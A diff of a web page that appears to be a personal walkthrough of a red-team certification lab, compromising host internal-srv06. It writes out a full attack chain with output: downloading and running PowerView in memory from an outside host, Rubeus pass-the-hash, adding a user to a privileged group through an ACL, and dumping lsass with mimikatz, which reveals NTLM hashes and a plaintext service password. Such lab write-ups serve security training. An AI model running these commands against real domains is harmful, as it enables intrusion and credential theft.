@@ -26,12 +26,12 @@
 
 
 <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>CRTM Walkthrough Global Central Bank | The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</title>
+<title>CRTM Walkthrough Global Central Bank | This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity</title>
 <meta name="generator" content="Jekyll v4.3.2" />
 <meta property="og:title" content="CRTM Walkthrough Global Central Bank" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
-<meta property="og:description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
+<meta name="description" content="This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity" />
+<meta property="og:description" content="This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity" />
 <link rel="canonical" href="http://localhost:4000/internal-srv06.html" />
 <meta property="og:url" content="http://localhost:4000/internal-srv06.html" />
 <meta property="og:site_name" content="CRTM Walkthrough Global Central Bank" />
@@ -39,7 +39,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="CRTM Walkthrough Global Central Bank" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebPage","description":"The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/internal-srv06.html"}</script>
+{"@context":"https://schema.org","@type":"WebPage","description":"This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/internal-srv06.html"}</script>
 <!-- End Jekyll SEO tag -->
 
   </head>
@@ -51,7 +51,7 @@
         <a id="a-title" href="/">
           <h1>CRTM Walkthrough Global Central Bank</h1>
         </a>
-        <h2>The webpage it's based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</h2>
+        <h2>This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity</h2>
 
         <section id="downloads">
           
@@ -65,14 +65,443 @@
 
     <div class="container">
       <section id="main_content">
-        <p>Enumerate doamin and find an explicit group that could be added to ITemployee15</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+        <h2 id="internal-srv06-19216825075">internal-srv06 192.168.250.75</h2>
 
-<p>Detect LAPS privileges on domain Extract Local administrator credentials</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<p>From msp.local domain enum domain acls for internal.msp.local domain in order to access to internal-srv06.internal.msp.local target machine:</p>
 
-<p>And Access to the target machine:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nslookup internal-srv06.internal.msp.local
+Non-authoritative answer:
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  192.168.250.1
+
+Name:    internal-srv06.internal.msp.local
+Address:  192.168.250.75
+</code></pre></div></div>
+
+<p>Load PowerView:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15:443/PowerView.ps1")
+IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15:443/PowerView.ps1")
+PS C:\&gt; Get-DomainTrust
+Get-DomainTrust
+
+
+SourceName      : msp.local
+TargetName      : internal.msp.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 5/26/2019 9:30:03 AM
+WhenChanged     : 4/29/2024 7:04:10 AM
+
+SourceName      : msp.local
+TargetName      : it.gcb.local
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FILTER_SIDS
+TrustDirection  : Outbound
+WhenCreated     : 5/31/2019 5:17:00 AM
+WhenChanged     : 2/13/2024 11:59:44 AM
+</code></pre></div></div>
+
+<p>Find DACLs for internal.msp.local:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -Domain internal.msp.local -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -like '*mspdb*'}
+
+
+AceQualifier           : AccessAllowed
+ObjectDN               : CN=ForestManagers,CN=Users,DC=internal,DC=msp,DC=local
+ActiveDirectoryRights  : Self
+ObjectAceType          : Self-Membership
+ObjectSID              : S-1-5-21-2754435719-1041067879-922430489-1118
+InheritanceFlags       : None
+BinaryLength           : 56
+AceType                : AccessAllowedObject
+ObjectAceFlags         : ObjectAceTypePresent
+IsCallback             : False
+PropagationFlags       : None
+SecurityIdentifier     : S-1-5-21-2998733414-582960673-4099777928-1107
+AccessMask             : 8
+AuditFlags             : None
+IsInherited            : False
+AceFlags               : None
+InheritedObjectAceType : All
+OpaqueLength           : 0
+IdentityName           : MSP\mspdb
+
+AceType               : AccessAllowed
+ObjectDN              : CN=ForestManagers,CN=Users,DC=internal,DC=msp,DC=local
+ActiveDirectoryRights : ReadProperty, GenericExecute
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-2754435719-1041067879-922430489-1118
+InheritanceFlags      : None
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-2998733414-582960673-4099777928-1107
+AccessMask            : 131092
+AuditFlags            : None
+AceFlags              : None
+AceQualifier          : AccessAllowed
+IdentityName          : MSP\mspdb
+</code></pre></div></div>
+
+<p>Add Group membership to ForestManagers with mspdb privileges:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; C:\Rubeus.exe asktgt /domain:msp.local /user:mspdb /ntlm:90b1b0e51da0ba63796d66a38c1b67d3 /ptt
+C:\Rubeus.exe asktgt /domain:msp.local /user:mspdb /ntlm:90b1b0e51da0ba63796d66a38c1b67d3 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 90b1b0e51da0ba63796d66a38c1b67d3
+[*] Building AS-REQ (w/ preauth) for: 'msp.local\mspdb'
+[*] Using domain controller: 192.168.250.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFMjCCBS6gAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoQsbCU1TUC5MT0NBTKIeMBygAwIB
+      AqEVMBMbBmtyYnRndBsJbXNwLmxvY2Fso4IEETCCBA2gAwIBEqEDAgECooID/wSCA/t0cZdpxtgbxOKw
+      Zonzp1m9prHc2VhEfT97x13KFt/s8yp2RT4UHUKr1KlNb9dd1FNeLlwEJDcJFHgswhLz6iJ9fxMLKAN1
+      D3QF0etdWl6Y4XOyL1DEXbsHzlkSPIQENGqWHHMRITFLMLkBT1fVOYdrBleFwdDLMGL7dWo3O+s+6JBw
+      19G1Ty3FmsvTUNq8oQ4iwg4d0LkM5VJjigLwoTj5EPrfUIXwLFlOb15LBkRrYx0/5hHGWZEK5fXSF/xy
+      i1tMb0EksjdDD86e43KtJVSCP/db1VwCjwY/IQ9xmp2kbktzGlYdEwKXFIYGkOeT+nVmyOIRooWzQxnW
+      Wz01to44Gy9mSOzs4z7mTjTLuKeZBm/yLo/rMvTMYEbylxe1mWmghnh/pzzjH5QBiakTT7P1KQcxTxjE
+      ZysfRldFZLvBVwmGeMSq2NXO+CLLcKLsXysv6Ok8yGPUmSRRq8qPZh07DH2cPmLAqeNEQ5nvgzEFIyvr
+      3zUc9EF7Au05rSWAHdI4rlFC4DHV5FVpvJ0vZp029gSBvMtneOmoAxuXqqsesd8O4TtNUotUZKFBpM5z
+      2khiTCiQ89Czy+Nzv19R4Ez7sKagWW4nzBNJec6R8X20oOUYEknUE0eBU3g7z/s0StEW+iey2I2Jrx36
+      UR5FPpux4aQsn4MRCb8tzYQOVsxwe8rDVq+Ygr73Qc8rB4Lc557vLAvFIEqnItXp0GTX823EpwfMvLOt
+      4efatSoThPmcrP9u2nqQfoIbCU97ThNKCHBa3PBdU37+NCUhLBteFmV2BwirQpAUsx7Ba00oPuvNRYMx
+      YdPCSPIKfYmKPTYWph65AFeI2h9BLhztWd6c5FEa4Endw0ucykGmiB2yYy2txtzjoZQW47xonQ4zhhZq
+      ILTSojogOq9NY/BcMpkxw+UIbPBHlmncGLG4RbfjSw37P0I+TVt1NDnAr7+Hw1VZ1VwFbQC0+hfpf8qK
+      mXaVCjFfELA9bDY6X3trQi+IKuyc8tuC4MRIGl2eH/2T/hFEhUh3cCvDLFOCFMiqHXwJEYW9UIzFW+Ga
+      2Lu8ZudnH+y/+PajDXXORRmxFpwI3YmhsgyYuxnu57bGdj5craXzChL+aH2dhe3+WE/KOSROi4mv6Flz
+      xBZ/VJVh4i1GiAQ5++IRO7PSJ5Osr9eikLwznyO1mydRe2pv1guisjiopKTtMbIsBOHy267kD46uIxON
+      ylsGHTpfDv0kHioTcKIuZxOvMTU9DMtJDN1BK7LpfEzP4nYkZjuRoDneMjtCrgcW3qGnPQqgmIo6JrxF
+      GkYep2q0vS7MNtoNb7f/9mtN5a2JJA3KWfMW58zn/L2z0wg4eWg101TWwUdSsO37cKOByjCBx6ADAgEA
+      ooG/BIG8fYG5MIG2oIGzMIGwMIGtoBswGaADAgEXoRIEEN4s8Nt2qbrcMU9uGQwwCPWhCxsJTVNQLkxP
+      Q0FMohIwEKADAgEBoQkwBxsFbXNwZGKjBwMFAEDhAAClERgPMjAyNDA3MTkxMjM2MDFaphEYDzIwMjQw
+      NzE5MjIzNjAxWqcRGA8yMDI0MDcyNjEyMzYwMVqoCxsJTVNQLkxPQ0FMqR4wHKADAgECoRUwExsGa3Ji
+      dGd0Gwltc3AubG9jYWw=
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/msp.local
+  ServiceRealm             :  MSP.LOCAL
+  UserName                 :  mspdb
+  UserRealm                :  MSP.LOCAL
+  StartTime                :  7/19/2024 5:36:01 AM
+  EndTime                  :  7/19/2024 3:36:01 PM
+  RenewTill                :  7/26/2024 5:36:01 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  3izw23aputwxT24ZDDAI9Q==
+  ASREP (key)              :  90B1B0E51DA0BA63796D66A38C1B67D3
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://192.168.100.15:443/Microsoft.ActiveDirectory.Management.dll -OutFile C:\Microsoft.ActiveDirectory.Management.dll
+PS C:\&gt; Import-Module C:\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\Microsoft.ActiveDirectory.Management.dll
+PS C:\&gt; IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15:443/ActiveDirectory.psd1")
+IEX (New-Object Net.webclient).DownloadString("http://192.168.100.15:443/ActiveDirectory.psd1")
+
+Name                           Value
+----                           -----
+ModuleVersion                  1.0.0.0
+CLRVersion                     4.0
+TypesToProcess                 ActiveDirectory.Types.ps1xml
+HelpInfoUri                    http://go.microsoft.com/fwlink/?LinkId=390743
+CmdletsToExport                {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAccount, Add-ADDomainControlle...
+FormatsToProcess               ActiveDirectory.Format.ps1xml
+PowerShellVersion              3.0
+RequiredAssemblies             Microsoft.ActiveDirectory.Management
+GUID                           {43c15630-959c-49e4-a977-758c5cc93408}
+NestedModules                  Microsoft.ActiveDirectory.Management
+Copyright                      c Microsoft Corporation. All rights reserved.
+CompanyName                    Microsoft Corporation
+Author                         Microsoft Corporation
+
+
+PS C:\&gt; $mspdb = Get-ADUser -Identity mspdb -Server msp.local
+$mspdb = Get-ADUser -Identity mspdb -Server msp.local
+PS C:\&gt; $mspdb
+$mspdb
+
+
+GivenName          : msp
+Surname            : db
+UserPrincipalName  : mspdb
+Enabled            : True
+SamAccountName     : mspdb
+SID                : S-1-5-21-2998733414-582960673-4099777928-1107
+DistinguishedName  : CN=mspdb,CN=Users,DC=msp,DC=local
+Name               : mspdb
+ObjectClass        : user
+ObjectGuid         : 9158587d-8b16-4b38-a013-0bfd1f2a5aaf
+PropertyNames      : {DistinguishedName, Enabled, GivenName, Name...}
+AddedProperties    : {}
+RemovedProperties  : {}
+ModifiedProperties : {}
+PropertyCount      : 10
+
+
+
+PS C:\&gt; Add-ADGroupMember -Identity ForestManagers -Members $mspdb -Server internal.msp.local -Verbose
+Add-ADGroupMember -Identity ForestManagers -Members $mspdb -Server internal.msp.local -Verbose
+VERBOSE: Performing the operation "Set" on target "CN=ForestManagers,CN=Users,DC=internal,DC=msp,DC=local".
+</code></pre></div></div>
+
+<p>And finally access to internal-srv06.msp.local:</p>
+
+<p><img src="/assets/images/internal-srv06.png" alt="inetrnal-msp.local" /></p>
+
+<p>After disable AV Dump lsass process:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\mspdb&gt; Invoke-Mimi -Command '"privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::creds /patch"'
+Invoke-Mimi -Command '"privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::creds /patch"'
+
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 18:36:14
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(powershell) # privilege::debug
+Privilege '20' OK
+
+mimikatz(powershell) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 1491436 (00000000:0016c1ec)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/29/2024 12:04:35 AM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * NTLM     : b41c04f8ef95aa3e970fd70a05832fec
+         * SHA1     : 56633ea699d44c40c74918e7796c0ecb255b8770
+         * DPAPI    : 56633ea699d44c40c74918e7796c0ecb
+        tspkg :
+        wdigest :
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * Password : (null)
+        kerberos :
+         * Username : INTERNAL-SRV06$
+         * Domain   : internal.msp.local
+         * Password : 13 f0 e7 e4 89 05 e9 be 7f 2e a0 06 d8 35 0c ba 59 ce b2 d2 5f 17 9d cf 36 72 2a e9 38 38 66 21 44 a9 28 2c f2 8a 10 33 47 40 7b c6 f3 e6 76 11 79 5f f6 62 9e b7 05 d2 72 c9 f8 d9 5e bc 2b 3f 21 85 4a 0d 24 77 33 d8 89 c8 55 33 6b 0b 3b d1 6e b2 32 d4 05 2b 9c 76 f2 05 02 6f c3 46 d0 7f 15 24 ce 24 6a 12 8d cd 8d a6 97 36 26 10 bb a5 65 96 3f 70 e3 60 82 6f 90 dc 6f 67 d0 c4 c7 9d 4c f6 5e 78 29 d5 d9 0e 57 d2 3b 03 8c 49 4e 5b 94 64 c3 e6 34 af 9d 82 49 b0 bb f9 63 48 9b b4 af 0d 17 e6 e7 cf e1 1b ee 4b 43 40 81 90 a9 eb f7 1d c3 f0 70 ab f8 62 e2 29 23 96 a1 98 1e 8f 90 84 65 85 ca 44 f3 99 61 20 e4 9f f5 9b a0 f5 83 3e 6f 18 47 e1 83 fc 3c 08 21 22 2a da a7 29 b9 f1 11 65 5d 9b bb 4f d5 9f ff 2c 2f 72 04 ae
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 201555 (00000000:00031353)
+Session           : Service from 0
+User Name         : batchsvc
+Domain            : INTERNALMSP
+Logon Server      : INTERNAL-DC01
+Logon Time        : 4/28/2024 11:46:48 PM
+SID               : S-1-5-21-2754435719-1041067879-922430489-1120
+        msv :
+         [00000003] Primary
+         * Username : batchsvc
+         * Domain   : INTERNALMSP
+         * NTLM     : 10ee9d3f6da987cac9357548fadb7f7b
+         * SHA1     : 8a3f3fe9b212276e91435ca655b4a323195c4c12
+         * DPAPI    : 6c97f11d2820a2c4fdd00e11f7304f53
+        tspkg :
+        wdigest :
+         * Username : batchsvc
+         * Domain   : INTERNALMSP
+         * Password : (null)
+        kerberos :
+         * Username : batchsvc
+         * Domain   : INTERNAL.MSP.LOCAL
+         * Password : Serv!ceUser4Status
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 58611 (00000000:0000e4f3)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:46:30 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * NTLM     : b41c04f8ef95aa3e970fd70a05832fec
+         * SHA1     : 56633ea699d44c40c74918e7796c0ecb255b8770
+         * DPAPI    : 56633ea699d44c40c74918e7796c0ecb
+        tspkg :
+        wdigest :
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * Password : (null)
+        kerberos :
+         * Username : INTERNAL-SRV06$
+         * Domain   : internal.msp.local
+         * Password : 13 f0 e7 e4 89 05 e9 be 7f 2e a0 06 d8 35 0c ba 59 ce b2 d2 5f 17 9d cf 36 72 2a e9 38 38 66 21 44 a9 28 2c f2 8a 10 33 47 40 7b c6 f3 e6 76 11 79 5f f6 62 9e b7 05 d2 72 c9 f8 d9 5e bc 2b 3f 21 85 4a 0d 24 77 33 d8 89 c8 55 33 6b 0b 3b d1 6e b2 32 d4 05 2b 9c 76 f2 05 02 6f c3 46 d0 7f 15 24 ce 24 6a 12 8d cd 8d a6 97 36 26 10 bb a5 65 96 3f 70 e3 60 82 6f 90 dc 6f 67 d0 c4 c7 9d 4c f6 5e 78 29 d5 d9 0e 57 d2 3b 03 8c 49 4e 5b 94 64 c3 e6 34 af 9d 82 49 b0 bb f9 63 48 9b b4 af 0d 17 e6 e7 cf e1 1b ee 4b 43 40 81 90 a9 eb f7 1d c3 f0 70 ab f8 62 e2 29 23 96 a1 98 1e 8f 90 84 65 85 ca 44 f3 99 61 20 e4 9f f5 9b a0 f5 83 3e 6f 18 47 e1 83 fc 3c 08 21 22 2a da a7 29 b9 f1 11 65 5d 9b bb 4f d5 9f ff 2c 2f 72 04 ae
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : INTERNAL-SRV06$
+Domain            : INTERNALMSP
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:45:56 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * NTLM     : b41c04f8ef95aa3e970fd70a05832fec
+         * SHA1     : 56633ea699d44c40c74918e7796c0ecb255b8770
+         * DPAPI    : 56633ea699d44c40c74918e7796c0ecb
+        tspkg :
+        wdigest :
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * Password : (null)
+        kerberos :
+         * Username : internal-srv06$
+         * Domain   : INTERNAL.MSP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23147 (00000000:00005a6b)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:45:55 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * NTLM     : b41c04f8ef95aa3e970fd70a05832fec
+         * SHA1     : 56633ea699d44c40c74918e7796c0ecb255b8770
+         * DPAPI    : 56633ea699d44c40c74918e7796c0ecb
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1532511 (00000000:0017625f)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : INTERNAL-SRV06
+Logon Server      : INTERNAL-SRV06
+Logon Time        : 4/29/2024 12:04:46 AM
+SID               : S-1-5-21-2137559835-1316653602-1660959346-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : INTERNAL-SRV06
+         * NTLM     : 5d4d4a0d623b9d2e5aa51b4819b8cdf3
+         * SHA1     : 126648e9112b5dabdd160748210f5fe519730105
+         * DPAPI    : 126648e9112b5dabdd160748210f5fe5
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : INTERNAL-SRV06
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : INTERNAL-SRV06
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:46:31 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 24804 (00000000:000060e4)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:45:56 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * NTLM     : b41c04f8ef95aa3e970fd70a05832fec
+         * SHA1     : 56633ea699d44c40c74918e7796c0ecb255b8770
+         * DPAPI    : 56633ea699d44c40c74918e7796c0ecb
+        tspkg :
+        wdigest :
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * Password : (null)
+        kerberos :
+         * Username : INTERNAL-SRV06$
+         * Domain   : internal.msp.local
+         * Password : 13 f0 e7 e4 89 05 e9 be 7f 2e a0 06 d8 35 0c ba 59 ce b2 d2 5f 17 9d cf 36 72 2a e9 38 38 66 21 44 a9 28 2c f2 8a 10 33 47 40 7b c6 f3 e6 76 11 79 5f f6 62 9e b7 05 d2 72 c9 f8 d9 5e bc 2b 3f 21 85 4a 0d 24 77 33 d8 89 c8 55 33 6b 0b 3b d1 6e b2 32 d4 05 2b 9c 76 f2 05 02 6f c3 46 d0 7f 15 24 ce 24 6a 12 8d cd 8d a6 97 36 26 10 bb a5 65 96 3f 70 e3 60 82 6f 90 dc 6f 67 d0 c4 c7 9d 4c f6 5e 78 29 d5 d9 0e 57 d2 3b 03 8c 49 4e 5b 94 64 c3 e6 34 af 9d 82 49 b0 bb f9 63 48 9b b4 af 0d 17 e6 e7 cf e1 1b ee 4b 43 40 81 90 a9 eb f7 1d c3 f0 70 ab f8 62 e2 29 23 96 a1 98 1e 8f 90 84 65 85 ca 44 f3 99 61 20 e4 9f f5 9b a0 f5 83 3e 6f 18 47 e1 83 fc 3c 08 21 22 2a da a7 29 b9 f1 11 65 5d 9b bb 4f d5 9f ff 2c 2f 72 04 ae
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : INTERNAL-SRV06$
+Domain            : INTERNALMSP
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:45:55 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : INTERNAL-SRV06$
+         * Domain   : INTERNALMSP
+         * Password : (null)
+        kerberos :
+         * Username : internal-srv06$
+         * Domain   : INTERNAL.MSP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(powershell) # vault::list
+ERROR kuhl_m_vault_list ; VaultEnumerateVaults : 0x80090345
+
+mimikatz(powershell) # vault::creds /patch
+</code></pre></div></div>
 
 <p><a href="./section1.html">back</a></p>
 
